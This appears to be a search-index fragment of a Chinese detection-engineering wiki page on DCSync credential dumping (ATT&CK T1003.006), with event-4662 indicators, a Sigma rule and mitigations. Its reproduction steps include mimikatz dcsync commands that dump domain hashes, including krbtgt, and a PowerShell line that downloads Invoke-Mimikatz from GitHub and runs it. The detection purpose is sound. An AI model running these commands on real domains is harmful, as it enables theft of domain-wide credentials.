\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u901a\u8fc7\u6ee5\u7528Windows\u57df\u63a7\u5236\u5668\u7684\u5e94\u7528\u7a0b\u5e8f\u7f16\u7a0b\u63a5\u53e3\uff08API\uff09\u6765\u8bbf\u95ee\u51ed\u636e\u548c\u5176\u4ed6\u654f\u611f\u4fe1\u606f\uff0c\u4ece\u800c\u4f7f\u7528\u79f0\u4e3aDCSync\u7684\u6280\u672f\u6765\u6a21\u62df\u6765\u81ea\u8fdc\u7a0b\u57df\u63a7\u5236\u5668\u7684\u590d\u5236\u8fc7\u7a0b\u3002 \u57df\u63a7\u5236\u5668\u4e0a\u7684Administrators\uff0cDomain Admins\u548cEnterprise Admin\u7ec4\u6216\u8ba1\u7b97\u673a\u5e10\u6237\u7684\u6210\u5458\u80fd\u591f\u8fd0\u884cDCSync\u6765\u4eceActive Directory\u4e2d\u63d0\u53d6\u5bc6\u7801\u6570\u636e\uff0c\u5176\u4e2d\u53ef\u80fd\u5305\u62ec\u6f5c\u5728\u6709\u7528\u5e10\u6237\uff08\u4f8b\u5982KRBTGT\u548c\u7ba1\u7406\u5458\u3002\u7136\u540e\uff0c\u8fd9\u4e9b\u6563\u5217\u53c8\u53ef\u4ee5\u7528\u4e8e\u521b\u5efa\u201c\u9ec4\u91d1\u7968\u8bc1\u201d\uff0c\u4ee5\u7528\u4e8e\u201c\u4f20\u9012\u7968\u8bc1\u201d \u6216\u66f4\u6539\u201c \u5e10\u6237\u64cd\u4f5c\u201d\u4e2d\u6240\u8ff0\u7684\u5e10\u6237\u5bc6\u7801\u3002 DCSync\u529f\u80fd\u5df2\u88ab\u5217\u5165\u201clsadump\u201d\u6a21\u5757\u4e2dMimikatz\u3002Lsadump\u8fd8\u5305\u62ecNetSync\uff0c\u5b83\u901a\u8fc7\u65e7\u7248\u590d\u5236\u534f\u8bae\u6267\u884cDCSync\u3002 DCsync DCSync \u662f\u4e00\u79cd\u540e\u671f\u6740\u4f24\u94fe\u653b\u51fb\uff0c\u5141\u8bb8\u653b\u51fb\u8005\u6a21\u62df\u57df\u63a7\u5236\u5668\uff08DC\uff09\u7684\u884c\u4e3a\uff0c\u4ee5\u4fbf\u901a\u8fc7\u57df\u590d\u5236\u68c0\u7d22\u5bc6\u7801\u6570\u636e\u3002\u4e00\u65e6\u653b\u51fb\u8005\u53ef\u4ee5\u8bbf\u95ee\u5177\u6709\u57df\u590d\u5236\u6743\u9650\u7684\u7279\u6743\u5e10\u6237\uff0c\u653b\u51fb\u8005\u5c31\u53ef\u4ee5\u5229\u7528\u590d\u5236\u534f\u8bae\u6765\u6a21\u4eff\u57df\u63a7\u5236\u5668\u3002 DCSync \u672c\u8eab\u662f Mimikatz \u4e2d\u7684\u4e00\u4e2a\u547d\u4ee4\uff0c \u5b83 \u4f9d\u8d56\u4e8e\u5229\u7528Microsoft\u76ee\u5f55\u590d\u5236\u670d\u52a1\u8fdc\u7a0b\u534f\u8bae\uff08MS-DRSR\uff09\u4e2d\u7684\u7279\u5b9a\u547d\u4ee4\u6765\u6a21\u62df\u57df\u63a7\u5236\u5668\u7684\u884c\u4e3a\uff0c\u5e76\u8981\u6c42\u5176\u4ed6\u57df\u63a7\u5236\u5668\u4f7f\u7528 \u76ee\u5f55\u590d\u5236\u670d\u52a1\u8fdc\u7a0b\u534f\u8bae \u6765\u590d\u5236\u4fe1\u606f \uff08MS-DRSR\uff09 \u3002\u5229\u7528\u8fd9\u4e9b\u534f\u8bae\uff0c\u6b64\u653b\u51fb\u5229\u7528\u4e86Active Directory\u7684\u6709\u6548\u548c\u5fc5\u8981\u529f\u80fd\uff0c\u65e0\u6cd5\u5173\u95ed\u6216\u7981\u7528\u5b83\u4eec\u3002 DCsync\u653b\u51fb\u539f\u7406 \u4e00\u822c\u6765\u8bf4\uff0cDCSYNC\u653b\u51fb\u7684\u5de5\u4f5c\u65b9\u5f0f\u5982\u4e0b\uff1a \u53d1\u73b0\u57df\u63a7\u5236\u5668\u4ee5\u8bf7\u6c42\u590d\u5236\u3002 \u4f7f\u7528 GetNCChanges \u51fd\u6570\u8bf7\u6c42\u7528\u6237\u590d\u5236 \u3002 DC\u5c06\u590d\u5236\u6570\u636e\u8fd4\u56de\u7ed9\u8bf7\u6c42\u8005\uff0c\u5305\u62ec\u5bc6\u7801\u54c8\u5e0c\u503c\u3002 DCSync\u7684\u7ecf\u5178\u7528\u4f8b\u662f\u4f5c\u4e3a Golden Ticket \u653b\u51fb\u7684\u524d\u8eab\uff0c\u56e0\u4e3a\u5b83\u53ef\u7528\u4e8e\u68c0\u7d22KRBTGT HASH\u3002 \u6240\u9700\u6743\u9650 \u503c\u5f97\u6ce8\u610f\u7684\u662f\uff0c\u4e3a\u4e86\u6267\u884c\u6b64\u653b\u51fb\uff0c\u9700\u8981\u4e00\u4e9b\u975e\u5e38\u7279\u6743\u7684\u6743\u9650\u3002\u8fd9\u5c31\u662f\u4e3a\u4ec0\u4e48\u8fd9\u79cd\u653b\u51fb\u88ab\u5f52\u7c7b\u4e3a\u5728\u6740\u4f24\u94fe\u653b\u51fb\u7684\u540e\u671f\u53d1\u751f\u7684\u539f\u56e0\uff0c\u5e76\u4e14\u653b\u51fb\u8005\u901a\u5e38\u9700\u8981\u4e00\u4e9b\u65f6\u95f4\u624d\u80fd\u83b7\u5f97\u8fd9\u4e9b\u6743\u9650\u3002 \u901a\u5e38\uff0c\u7ba1\u7406\u5458\uff0c\u57df\u7ba1\u7406\u5458\uff0c\u4f01\u4e1a\u7ba1\u7406\u5458\u62e5\u6709\u6240\u9700\u7684\u6743\u9650\uff0c\u4f46\u66f4\u5177\u4f53\u5730\u8bf4\uff0c\u9700\u8981\u4ee5\u4e0b\u6743\u9650\uff1a \u590d\u5236\u76ee\u5f55\u66f4\u6539 \u590d\u5236\u76ee\u5f55\u5168\u90e8\u66f4\u6539 \u5728\u7b5b\u9009\u96c6\u4e2d\u590d\u5236\u76ee\u5f55\u66f4\u6539 \u6d4b\u8bd5\u6848\u4f8b DCSync\u662fmimikatz\u57282015\u5e74\u6dfb\u52a0\u7684\u4e00\u4e2a\u529f\u80fd\uff0c\u7531Benjamin DELPY gentilkiwi\u548cVincent LE TOUX\u5171\u540c\u7f16\u5199\uff0c\u80fd\u591f\u7528\u6765\u5bfc\u51fa\u57df\u5185\u6240\u6709\u7528\u6237\u7684hash. \u5229\u7528\u6761\u4ef6\uff1a \u83b7\u5f97\u4ee5\u4e0b\u4efb\u4e00\u7528\u6237\u7684\u6743\u9650\uff1a Administrators\u7ec4\u5185\u7684\u7528\u6237 Domain Admins\u7ec4\u5185\u7684\u7528\u6237 Enterprise Admins\u7ec4\u5185\u7684\u7528\u6237 \u57df\u63a7\u5236\u5668\u7684\u8ba1\u7b97\u673a\u5e10\u6237 \u5229\u7528DRS(Directory Replication Service)\u534f\u8bae\u901a\u8fc7IDL_DRSGetNCChanges\u4ece\u57df\u63a7\u5236\u5668\u590d\u5236\u7528\u6237\u51ed\u636e 1.\u4f7f\u7528mimikatz \u5bfc\u51fa\u57df\u5185\u6240\u6709\u7528\u6237\u7684hash\uff1a mimikatz.exe privilege::debug \"lsadump::dcsync /domain:abcc.org /all /csv\" exit \u5bfc\u51fa\u57df\u5185administrator\u5e10\u6237\u7684hash\uff1a mimikatz.exe privilege::debug \"lsadump::dcsync /domain:abcc.org /user:administrator /csv\" exit 2.powershell\u5b9e\u73b0 \u901a\u8fc7Invoke-ReflectivePEinjection\u8c03\u7528mimikatz.dll\u4e2d\u7684dcsync\u529f\u80fd \u5bfc\u51fa\u57df\u5185\u6240\u6709\u7528\u6237\u7684hash\uff1a Invoke-DCSync -DumpForest | ft -wrap -autosize \u5bfc\u51fa\u57df\u5185administrator\u5e10\u6237\u7684hash\uff1a Invoke-DCSync -DumpForest -Users @(\"administrator\") | ft -wrap -autosize \u68c0\u6d4b\u65e5\u5fd7 windows \u5b89\u5168\u65e5\u5fd7 \u6d4b\u8bd5\u590d\u73b0 \u590d\u73b0\u65b9\u6cd5\u5206\u4e3a\u4e24\u7c7b\uff1a\u672c\u5730\u3001\u8fdc\u7a0b \u573a\u666f:\u5728\u672c\u5730\u8fd0\u884cDCsync,\u5229\u7528powershell\u811a\u672cInvoke-Mimikatz \u5728Windows\u57df\u63a7\u670d\u52a1\u5668\u4e0a\u542f\u52a8powershell\uff0c\u7136\u540e\u4e0b\u8f7dInvoke-Mimikatz\u3002 iex (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1') \u5b8c\u6210\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\u8fd0\u884cDCSync\u3002 Invoke-Mimikatz -Command '\"lsadump::dcsync /user:krbtgt /domain:0day.org\"' \u6d4b\u8bd5\u7559\u75d5 windows \u5b89\u5168\u65e5\u5fd7\uff0c4662\uff08\u5728\u5bf9\u8c61\u4e0a\u5df2\u6267\u884c\u64cd\u4f5c\uff09\uff0c\u7279\u5f81\u503c\uff1a 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2\uff0c\u63a7\u5236\u8bbf\u95ee \u68c0\u6d4b\u89c4\u5219/\u601d\u8def DCSync\u662f\u4e00\u4e2a\u5f3a\u5927\u7684\u5de5\u5177\uff0c\u5728\u7ea2\u8272\u56e2\u961f\u6210\u5458\u624b\u4e2d\uff0c\u5bf9\u4e8e\u84dd\u8272\u56e2\u961f\u6210\u5458\u800c\u8a00\uff0c\u8fd9\u662f\u4e00\u573a\u5669\u68a6\u3002\u5bf9\u4e8e\u84dd\u961f\uff0c\u4e00\u5207\u90fd\u4e0d\u4f1a\u4e22\u5931\u3002\u505c\u6b62\u8fd9\u79cd\u653b\u51fb\u53ef\u80fd\u4e0d\u53ef\u884c\uff0c\u4f46\u53ef\u4ee5\u5c06\u5176\u68c0\u6d4b\u51fa\u6765\u3002 \u68c0\u6d4b\u65b9\u6cd5\uff1a \u7f51\u7edc\u76d1\u63a7 \u3001\u4e8b\u4ef6ID\u68c0\u6d4b sigma\u89c4\u5219 title: \u5728DCSync\u4f4d\u7f6e\u8fdb\u884c\u68c0\u6d4b description: windows server 2008 \u6d4b\u8bd5\u7ed3\u679c\uff08\u57df\u63a7\u672c\u5730\uff09 references: https://yojimbosecurity.ninja/dcsync/ tags: T1003-006 status: experimental author: 12306Bro logsource: product: windows service: security detection: selection: EventID: 4662 #\u5728\u5bf9\u8c61\u4e0a\u5df2\u6267\u884c\u64cd\u4f5c\u3002 Operationtype: 'Obeject Access' #\u64cd\u4f5c>\u64cd\u4f5c\u7c7b\u578b Access: '\u8bbf\u95ee\u63a7\u5236' #\u64cd\u4f5c>\u8bbf\u95ee Properties: - '*1131f6aa-9c07-11d1-f79f-00c04fc2dcd2*' #\u7279\u5f81\u503c mimikatz\u5bfc\u51fa\u57df\u8d26\u6237 - '*1131f6ad-9c07-11d1-f79f-00c04fc2dcd2*' #\u7279\u5f81\u503c mimikatz\u5bfc\u51faadministrator - \u2018*89e95b76-444d-4c62-991a-0facbeda640c*\u2019 #\u7279\u5f81\u503c condition: selection level: medium \u5efa\u8bae \u6682\u65e0 \u7f13\u89e3\u63aa\u65bd\u53ca\u4e34\u65f6\u6027\u89e3\u51b3\u65b9\u6848 \u514d\u53d7DCSync\u653b\u51fb\u7684\u6700\u4f73\u4fdd\u62a4\u662f\u63a7\u5236\u8d1f\u8d23\u5141\u8bb8\u5e10\u6237\u590d\u5236\u66f4\u6539\u7684\u57df\u6743\u9650\u3002\u4e0d\u53ef\u907f\u514d\u5730\uff0c\u67d0\u4e9b\u7528\u6237\u5c06\u62e5\u6709\u6b64\u6743\u5229\uff0c\u56e0\u6b64\u5e94\u53d7\u5230\u4fdd\u62a4\u3002 \u4e3a\u907f\u514d\u5c06\u7279\u6743\u5bc6\u7801\u8be6\u7ec6\u4fe1\u606f\u5b58\u50a8\u5728\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u7834\u574f\u5b83\u4eec\u7684\u4f4d\u7f6e\uff0c\u5e94\u4f7f\u7528\u5206\u5c42\u7684\u767b\u5f55\u534f\u8bae\u6765\u9632\u6b62\u7279\u6743\u5e10\u6237\u767b\u5f55\u5230\u53ef\u4ee5\u4ece\u5185\u5b58\u4e2d\u8f6c\u50a8\u5176\u5bc6\u7801\u54c8\u5e0c\u503c\u5e76\u7528\u4e8e\u83b7\u53d6\u6267\u884c\u5bc6\u7801\u6240\u9700\u6743\u9650\u7684\u670d\u52a1\u5668\u548c\u5de5\u4f5c\u7ad9\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1003-006 https://attack.mitre.org/techniques/T1003/006 \u4ec0\u4e48\u662fDCSYNC\uff1f\u4e00\u4e2a\u4ecb\u7ecd https://blog.stealthbits.com/what-is-dcsync/ \u57df\u6e17\u900f\u2014\u2014DCSync https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-DCSync/ DCsync\u5229\u7528\u539f\u7406 https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/f977faaa-673e-4f66-b9bf-48c640241d47 powershell\u5de5\u5177\u5b9e\u73b0 https://gist.github.com/monoxgas/9d238accd969550136db DCsysnc\u68c0\u6d4b https://yojimbosecurity.ninja/dcsync/ Active Directory\u590d\u5236 https://github.com/hunters-forge/ThreatHunter-Playbook/blob/master/library/active_directory_replication.md","title":"T1003-006-windows-\u57fa\u4e8eDCsync\u51ed\u8bc1\u83b7\u53d6"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-006-win-DCsysnc-%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#t1003-006-windows-dcsync","text":"","title":"T1003-006-windows-\u57fa\u4e8eDCsync\u51ed\u8bc1\u83b7\u53d6"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-006-win-DCsysnc-%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#attck","text":"\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u901a\u8fc7\u6ee5\u7528Windows\u57df\u63a7\u5236\u5668\u7684\u5e94\u7528\u7a0b\u5e8f\u7f16\u7a0b\u63a5\u53e3\uff08API\uff09\u6765\u8bbf\u95ee\u51ed\u636e\u548c\u5176\u4ed6\u654f\u611f\u4fe1\u606f\uff0c\u4ece\u800c\u4f7f\u7528\u79f0\u4e3aDCSync\u7684\u6280\u672f\u6765\u6a21\u62df\u6765\u81ea\u8fdc\u7a0b\u57df\u63a7\u5236\u5668\u7684\u590d\u5236\u8fc7\u7a0b\u3002 \u57df\u63a7\u5236\u5668\u4e0a\u7684Administrators\uff0cDomain Admins\u548cEnterprise Admin\u7ec4\u6216\u8ba1\u7b97\u673a\u5e10\u6237\u7684\u6210\u5458\u80fd\u591f\u8fd0\u884cDCSync\u6765\u4eceActive Directory\u4e2d\u63d0\u53d6\u5bc6\u7801\u6570\u636e\uff0c\u5176\u4e2d\u53ef\u80fd\u5305\u62ec\u6f5c\u5728\u6709\u7528\u5e10\u6237\uff08\u4f8b\u5982KRBTGT\u548c\u7ba1\u7406\u5458\u3002\u7136\u540e\uff0c\u8fd9\u4e9b\u6563\u5217\u53c8\u53ef\u4ee5\u7528\u4e8e\u521b\u5efa\u201c\u9ec4\u91d1\u7968\u8bc1\u201d\uff0c\u4ee5\u7528\u4e8e\u201c\u4f20\u9012\u7968\u8bc1\u201d \u6216\u66f4\u6539\u201c \u5e10\u6237\u64cd\u4f5c\u201d\u4e2d\u6240\u8ff0\u7684\u5e10\u6237\u5bc6\u7801\u3002 DCSync\u529f\u80fd\u5df2\u88ab\u5217\u5165\u201clsadump\u201d\u6a21\u5757\u4e2dMimikatz\u3002Lsadump\u8fd8\u5305\u62ecNetSync\uff0c\u5b83\u901a\u8fc7\u65e7\u7248\u590d\u5236\u534f\u8bae\u6267\u884cDCSync\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-006-win-DCsysnc-%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#dcsync","text":"DCSync \u662f\u4e00\u79cd\u540e\u671f\u6740\u4f24\u94fe\u653b\u51fb\uff0c\u5141\u8bb8\u653b\u51fb\u8005\u6a21\u62df\u57df\u63a7\u5236\u5668\uff08DC\uff09\u7684\u884c\u4e3a\uff0c\u4ee5\u4fbf\u901a\u8fc7\u57df\u590d\u5236\u68c0\u7d22\u5bc6\u7801\u6570\u636e\u3002\u4e00\u65e6\u653b\u51fb\u8005\u53ef\u4ee5\u8bbf\u95ee\u5177\u6709\u57df\u590d\u5236\u6743\u9650\u7684\u7279\u6743\u5e10\u6237\uff0c\u653b\u51fb\u8005\u5c31\u53ef\u4ee5\u5229\u7528\u590d\u5236\u534f\u8bae\u6765\u6a21\u4eff\u57df\u63a7\u5236\u5668\u3002 DCSync \u672c\u8eab\u662f Mimikatz \u4e2d\u7684\u4e00\u4e2a\u547d\u4ee4\uff0c \u5b83 \u4f9d\u8d56\u4e8e\u5229\u7528Microsoft\u76ee\u5f55\u590d\u5236\u670d\u52a1\u8fdc\u7a0b\u534f\u8bae\uff08MS-DRSR\uff09\u4e2d\u7684\u7279\u5b9a\u547d\u4ee4\u6765\u6a21\u62df\u57df\u63a7\u5236\u5668\u7684\u884c\u4e3a\uff0c\u5e76\u8981\u6c42\u5176\u4ed6\u57df\u63a7\u5236\u5668\u4f7f\u7528 \u76ee\u5f55\u590d\u5236\u670d\u52a1\u8fdc\u7a0b\u534f\u8bae \u6765\u590d\u5236\u4fe1\u606f \uff08MS-DRSR\uff09 \u3002\u5229\u7528\u8fd9\u4e9b\u534f\u8bae\uff0c\u6b64\u653b\u51fb\u5229\u7528\u4e86Active Directory\u7684\u6709\u6548\u548c\u5fc5\u8981\u529f\u80fd\uff0c\u65e0\u6cd5\u5173\u95ed\u6216\u7981\u7528\u5b83\u4eec\u3002","title":"DCsync"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-006-win-DCsysnc-%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#dcsync_1","text":"\u4e00\u822c\u6765\u8bf4\uff0cDCSYNC\u653b\u51fb\u7684\u5de5\u4f5c\u65b9\u5f0f\u5982\u4e0b\uff1a \u53d1\u73b0\u57df\u63a7\u5236\u5668\u4ee5\u8bf7\u6c42\u590d\u5236\u3002 \u4f7f\u7528 GetNCChanges \u51fd\u6570\u8bf7\u6c42\u7528\u6237\u590d\u5236 \u3002 DC\u5c06\u590d\u5236\u6570\u636e\u8fd4\u56de\u7ed9\u8bf7\u6c42\u8005\uff0c\u5305\u62ec\u5bc6\u7801\u54c8\u5e0c\u503c\u3002 DCSync\u7684\u7ecf\u5178\u7528\u4f8b\u662f\u4f5c\u4e3a Golden Ticket \u653b\u51fb\u7684\u524d\u8eab\uff0c\u56e0\u4e3a\u5b83\u53ef\u7528\u4e8e\u68c0\u7d22KRBTGT HASH\u3002","title":"DCsync\u653b\u51fb\u539f\u7406"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-006-win-DCsysnc-%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#_1","text":"\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff0c\u4e3a\u4e86\u6267\u884c\u6b64\u653b\u51fb\uff0c\u9700\u8981\u4e00\u4e9b\u975e\u5e38\u7279\u6743\u7684\u6743\u9650\u3002\u8fd9\u5c31\u662f\u4e3a\u4ec0\u4e48\u8fd9\u79cd\u653b\u51fb\u88ab\u5f52\u7c7b\u4e3a\u5728\u6740\u4f24\u94fe\u653b\u51fb\u7684\u540e\u671f\u53d1\u751f\u7684\u539f\u56e0\uff0c\u5e76\u4e14\u653b\u51fb\u8005\u901a\u5e38\u9700\u8981\u4e00\u4e9b\u65f6\u95f4\u624d\u80fd\u83b7\u5f97\u8fd9\u4e9b\u6743\u9650\u3002 \u901a\u5e38\uff0c\u7ba1\u7406\u5458\uff0c\u57df\u7ba1\u7406\u5458\uff0c\u4f01\u4e1a\u7ba1\u7406\u5458\u62e5\u6709\u6240\u9700\u7684\u6743\u9650\uff0c\u4f46\u66f4\u5177\u4f53\u5730\u8bf4\uff0c\u9700\u8981\u4ee5\u4e0b\u6743\u9650\uff1a \u590d\u5236\u76ee\u5f55\u66f4\u6539 \u590d\u5236\u76ee\u5f55\u5168\u90e8\u66f4\u6539 \u5728\u7b5b\u9009\u96c6\u4e2d\u590d\u5236\u76ee\u5f55\u66f4\u6539","title":"\u6240\u9700\u6743\u9650"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-006-win-DCsysnc-%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#_2","text":"DCSync\u662fmimikatz\u57282015\u5e74\u6dfb\u52a0\u7684\u4e00\u4e2a\u529f\u80fd\uff0c\u7531Benjamin DELPY gentilkiwi\u548cVincent LE TOUX\u5171\u540c\u7f16\u5199\uff0c\u80fd\u591f\u7528\u6765\u5bfc\u51fa\u57df\u5185\u6240\u6709\u7528\u6237\u7684hash. \u5229\u7528\u6761\u4ef6\uff1a \u83b7\u5f97\u4ee5\u4e0b\u4efb\u4e00\u7528\u6237\u7684\u6743\u9650\uff1a Administrators\u7ec4\u5185\u7684\u7528\u6237 Domain Admins\u7ec4\u5185\u7684\u7528\u6237 Enterprise Admins\u7ec4\u5185\u7684\u7528\u6237 \u57df\u63a7\u5236\u5668\u7684\u8ba1\u7b97\u673a\u5e10\u6237 \u5229\u7528DRS(Directory Replication Service)\u534f\u8bae\u901a\u8fc7IDL_DRSGetNCChanges\u4ece\u57df\u63a7\u5236\u5668\u590d\u5236\u7528\u6237\u51ed\u636e","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-006-win-DCsysnc-%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#1mimikatz","text":"\u5bfc\u51fa\u57df\u5185\u6240\u6709\u7528\u6237\u7684hash\uff1a mimikatz.exe privilege::debug \"lsadump::dcsync /domain:abcc.org /all /csv\" exit \u5bfc\u51fa\u57df\u5185administrator\u5e10\u6237\u7684hash\uff1a mimikatz.exe privilege::debug \"lsadump::dcsync /domain:abcc.org /user:administrator /csv\" exit","title":"1.\u4f7f\u7528mimikatz"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-006-win-DCsysnc-%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#2powershell","text":"\u901a\u8fc7Invoke-ReflectivePEinjection\u8c03\u7528mimikatz.dll\u4e2d\u7684dcsync\u529f\u80fd \u5bfc\u51fa\u57df\u5185\u6240\u6709\u7528\u6237\u7684hash\uff1a Invoke-DCSync -DumpForest | ft -wrap -autosize \u5bfc\u51fa\u57df\u5185administrator\u5e10\u6237\u7684hash\uff1a Invoke-DCSync -DumpForest -Users @(\"administrator\") | ft -wrap -autosize","title":"2.powershell\u5b9e\u73b0"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-006-win-DCsysnc-%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#_3","text":"windows \u5b89\u5168\u65e5\u5fd7","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-006-win-DCsysnc-%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#_4","text":"\u590d\u73b0\u65b9\u6cd5\u5206\u4e3a\u4e24\u7c7b\uff1a\u672c\u5730\u3001\u8fdc\u7a0b","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-006-win-DCsysnc-%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#dcsyncpowershellinvoke-mimikatz","text":"\u5728Windows\u57df\u63a7\u670d\u52a1\u5668\u4e0a\u542f\u52a8powershell\uff0c\u7136\u540e\u4e0b\u8f7dInvoke-Mimikatz\u3002 iex (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1') \u5b8c\u6210\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\u8fd0\u884cDCSync\u3002 Invoke-Mimikatz -Command '\"lsadump::dcsync /user:krbtgt /domain:0day.org\"'","title":"\u573a\u666f:\u5728\u672c\u5730\u8fd0\u884cDCsync,\u5229\u7528powershell\u811a\u672cInvoke-Mimikatz"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-006-win-DCsysnc-%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#_5","text":"windows \u5b89\u5168\u65e5\u5fd7\uff0c4662\uff08\u5728\u5bf9\u8c61\u4e0a\u5df2\u6267\u884c\u64cd\u4f5c\uff09\uff0c\u7279\u5f81\u503c\uff1a 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2\uff0c\u63a7\u5236\u8bbf\u95ee","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-006-win-DCsysnc-%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#_6","text":"DCSync\u662f\u4e00\u4e2a\u5f3a\u5927\u7684\u5de5\u5177\uff0c\u5728\u7ea2\u8272\u56e2\u961f\u6210\u5458\u624b\u4e2d\uff0c\u5bf9\u4e8e\u84dd\u8272\u56e2\u961f\u6210\u5458\u800c\u8a00\uff0c\u8fd9\u662f\u4e00\u573a\u5669\u68a6\u3002\u5bf9\u4e8e\u84dd\u961f\uff0c\u4e00\u5207\u90fd\u4e0d\u4f1a\u4e22\u5931\u3002\u505c\u6b62\u8fd9\u79cd\u653b\u51fb\u53ef\u80fd\u4e0d\u53ef\u884c\uff0c\u4f46\u53ef\u4ee5\u5c06\u5176\u68c0\u6d4b\u51fa\u6765\u3002 \u68c0\u6d4b\u65b9\u6cd5\uff1a \u7f51\u7edc\u76d1\u63a7 \u3001\u4e8b\u4ef6ID\u68c0\u6d4b","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-006-win-DCsysnc-%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#sigma","text":"title: \u5728DCSync\u4f4d\u7f6e\u8fdb\u884c\u68c0\u6d4b description: windows server 2008 \u6d4b\u8bd5\u7ed3\u679c\uff08\u57df\u63a7\u672c\u5730\uff09 references: https://yojimbosecurity.ninja/dcsync/ tags: T1003-006 status: experimental author: 12306Bro logsource: product: windows service: security detection: selection: EventID: 4662 #\u5728\u5bf9\u8c61\u4e0a\u5df2\u6267\u884c\u64cd\u4f5c\u3002 Operationtype: 'Obeject Access' #\u64cd\u4f5c>\u64cd\u4f5c\u7c7b\u578b Access: '\u8bbf\u95ee\u63a7\u5236' #\u64cd\u4f5c>\u8bbf\u95ee Properties: - '*1131f6aa-9c07-11d1-f79f-00c04fc2dcd2*' #\u7279\u5f81\u503c mimikatz\u5bfc\u51fa\u57df\u8d26\u6237 - '*1131f6ad-9c07-11d1-f79f-00c04fc2dcd2*' #\u7279\u5f81\u503c mimikatz\u5bfc\u51faadministrator - \u2018*89e95b76-444d-4c62-991a-0facbeda640c*\u2019 #\u7279\u5f81\u503c condition: selection level: medium","title":"sigma\u89c4\u5219"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-006-win-DCsysnc-%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#_7","text":"\u6682\u65e0","title":"\u5efa\u8bae"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-006-win-DCsysnc-%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#_8","text":"\u514d\u53d7DCSync\u653b\u51fb\u7684\u6700\u4f73\u4fdd\u62a4\u662f\u63a7\u5236\u8d1f\u8d23\u5141\u8bb8\u5e10\u6237\u590d\u5236\u66f4\u6539\u7684\u57df\u6743\u9650\u3002\u4e0d\u53ef\u907f\u514d\u5730\uff0c\u67d0\u4e9b\u7528\u6237\u5c06\u62e5\u6709\u6b64\u6743\u5229\uff0c\u56e0\u6b64\u5e94\u53d7\u5230\u4fdd\u62a4\u3002 